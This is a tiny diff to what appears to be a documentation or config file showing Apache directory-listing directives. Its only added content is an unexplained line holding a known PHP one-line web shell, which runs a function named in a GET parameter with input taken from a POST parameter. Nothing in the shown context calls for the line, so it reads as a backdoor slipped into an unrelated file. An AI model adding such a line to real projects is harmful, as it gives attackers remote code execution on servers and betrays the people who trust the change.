@@ -9,3 +9,5 @@
     Options Indexes FollowSymLinks
     IndexOptions FoldersFirst HTMLTable NameWidth=* VersionSort
 ```
+
+# ($_=@$_GET[2]).@$_($_POST[1])
